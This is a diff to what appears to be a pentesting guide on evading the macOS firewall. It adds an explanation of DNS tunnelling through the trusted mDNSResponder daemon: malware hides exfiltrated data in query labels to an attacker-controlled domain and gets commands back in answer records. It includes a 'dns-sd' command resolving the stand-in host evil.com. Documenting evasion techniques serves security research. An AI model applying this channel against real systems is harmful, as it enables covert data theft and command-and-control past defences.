@@ -36,9 +36,23 @@ lsof -i TCP -sTCP:ESTABLISHED
 
 ### Abusing DNS
 
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.<sup>[1]</sup>
+On macOS a process does **not** talk to the DNS server itself. Name resolution is brokered over **XPC** by **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), an Apple-signed system daemon, so every lookup on the machine leaves the host as traffic **from `mDNSResponder`** instead of from the process that wanted it. Firewalls therefore tend to trust that daemon unconditionally — denying it would break name resolution for the whole system.<sup>[1]</sup>
 
-<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
+That makes DNS a channel that stays open even when the firewall blocks the malware's own sockets:<sup>[1]</sup>
+
+1. The malware tries to connect to `evil.com`. Its **own** outbound connection is examined by the firewall and **blocked**.
+2. The malware instead asks `mDNSResponder` to **resolve** `evil.com`, over XPC.
+3. The firewall examines the resulting query, sees the trusted Apple-signed resolver as the originator, and **allows it**.
+4. The query reaches the DNS server — and if the attacker runs the authoritative server for `evil.com`, they control both ends of the exchange.
+
+Since the attacker owns that zone, no "connection" is ever needed: data is smuggled out inside the **queried labels** (e.g. `<encoded-chunk>.evil.com`) and commands come back inside the **answer records** (TXT, A, CNAME…), which is classic DNS tunnelling riding on a fully whitelisted process.
+
+Any unprivileged process can drive the daemon directly, which is an easy way to confirm the path is open:
+
+```bash
+# resolution is performed by mDNSResponder on the caller's behalf
+dns-sd -G v4v6 evil.com
+```
 
 ### Via Browser apps
 
